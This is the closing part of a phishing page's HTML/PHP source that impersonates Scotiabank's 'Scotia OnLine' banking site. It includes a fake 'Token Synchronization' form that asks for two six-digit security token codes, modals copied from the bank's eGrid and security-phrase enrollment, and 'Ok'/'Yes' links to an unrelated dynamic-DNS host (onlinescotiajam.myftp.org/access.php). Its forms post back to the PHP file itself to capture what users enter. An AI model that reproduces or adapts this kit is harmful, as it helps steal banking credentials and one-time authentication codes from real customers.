					<button type="button" class="close_icon" data-dismiss="modal"></button><label id="syncTokenIncludeForm:myModalLabel" class="RUIFW-modal-title modal-title modal-title">Token Synchronization</label>
				</div>
				<div class="RUIFW-modal-body wrapfrom modal-body modal-body"><div id="syncTokenIncludeForm:tokenMessages" class="col-md-12 success-msg"></div><span id="syncTokenIncludeForm:firstSecond">
						<div class="RUIFW-row row row">
							<div class="RUIFW-col-12 col-sm-12 col-sm-12">Your token needs to be synchronized before completing this transaction.							
							</div>
						</div>
						<div class="RUIFW-row row row">
							<div class="RUIFW-col-12 mrgn-top-20 col-sm-12 col-sm-12">
								<label for="fts">First Token sequence</label><div id="syncTokenIncludeForm:token1" class="RUIFW-inline">
                                    <input id="syncTokenIncludeForm:tokenOne" type="password" name="syncTokenIncludeForm:tokenOne" autocomplete="off" value="" maxlength="6" class="RUIFW-form-el RUIFW-input-md form-control form-control">
									<span class="token-holder"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/token.png"></span></div>
								<div class="form-alt-txt">(Type in the six digits that appear in your token screen).</div>
								<br>
							</div>
						</div>	
						<div class="RUIFW-row row row">
							<div class="RUIFW-col-6 col-sm-6 col-sm-6">
								<label for="sts">Second token sequence</label><div id="syncTokenIncludeForm:token2" class="RUIFW-inline">
                                    <input id="syncTokenIncludeForm:tokenTwo" type="password" name="syncTokenIncludeForm:tokenTwo" autocomplete="off" value="" maxlength="6" class="RUIFW-form-el RUIFW-input-md form-control form-control">
									<span class="token-holder"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/token.png"></span></div>
								<div class="form-alt-txt">(Type in the six digits that appear in your token screen).</div>
							</div><span id="syncTokenIncludeForm:synchronizationSuccessField">
</span>
						</div></span>
				</div>
				<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
                    <input id="syncTokenIncludeForm:synchronizeCancelButton" type="submit" name="syncTokenIncludeForm:synchronizeCancelButton" value="Cancel" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:cancelSynchronize});return false">
                    <input id="syncTokenIncludeForm:synchronizeConfirmButton" type="submit" name="syncTokenIncludeForm:synchronizeConfirmButton" value="Synchronize" class="RUIFW-btn-primary btn btn-primary btn btn-primary" onclick="mojarra.ab(this,event,&#39;action&#39;,&#39;@form&#39;,&#39;syncTokenIncludeForm:token1 syncTokenIncludeForm:token2 syncTokenIncludeForm:tokenMessages syncTokenIncludeForm:synchronizationSuccessField&#39;,{&#39;onevent&#39;:afterTokenSync});return false">
				</div>
			</div>
	    </div>
</form>
       		
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="skipEnrollmentPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="skipegridpopupForm" name="skipegridpopupForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						Important! You must create a security phrase to use Scotia Online/Mobile. This phrase will be displayed for your verification every time you sign in as an added layer of security.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipegridpopupForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
					</div>
				
			</div>
		</div>
        
</form>
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="skipQuestionPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="skipSecurityQuestionPopup" name="skipSecurityQuestionPopup" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						You have chosen not to set your eGrid.  You will be asked to set your eGrid when you need to perform certain transactions such as adding a payee or a funds transfer recipient.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipSecurityQuestionPopup:skip-enroll-step" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
					</div>
				
			</div>
		</div>
       
</form>
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="completeEnrollmentPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="completeEnrollmentForm" name="completeEnrollmentForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						You must download your eGrid before leaving this page. Please save, print or take a picture of your eGrid. You will need it when performing certain transactions such as setting up Bill Payments and Funds Transfers. Click "Cancel" to return to the previous page and download your eGrid or "OK" if you have already downloaded it.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="completeEnrollmentForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
					</div>
				
			</div>
		</div>

</form>
		</div><div id="blkpush">
<form id="createUsernameModalWindowFormWrapper" name="createUsernameModalWindowFormWrapper" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="modalCancelConfirmation" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
				
				<div class="RUIFW-modal-body modal-body"><span id="createUsernameModalWindowFormWrapper:modalCancelConfirmationmainMessageId">Are you sure you want to cancel the change? </span>
					<br>
					<br><span id="createUsernameModalWindowFormWrapper:modalCancelConfirmationsubMessageId"></span>
				</div>
				
				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
							<button id="modalCancelConfirmationNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="createUsernameModalWindowFormWrapper:modalCancelConfirmationYesButton" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
				</div>
				
			</div>
		</div>
	</div>

</form></div>

<div class="RUIFW-calculator">          <div class="RUIFW-calculator-head">		  <div class="close"><span class="icon-remove-circle"></span></div>		  </div>          <input id="calculator-field" class="RUIFW-form-el form-control form-control" value="0" readonly=""><div id="calculator-getNumber" class="calc-getnumber-field"></div>          <div class="RUIFW-calculator-keys">            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">7</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">8</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">9</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> + </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">4</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">5</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">6</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> - </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">1</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">2</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">3</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> * </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">0</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">.</button>              <button class="RUIFW-key btn btn-default" id="calcbtn-RESET" type="button">C</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> / </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-primary calculator-btn" id="calcbtn-CALC" type="button">=</button>            </div>          </div></div><span class="RUIFW-media-type"></span>
</body></html>
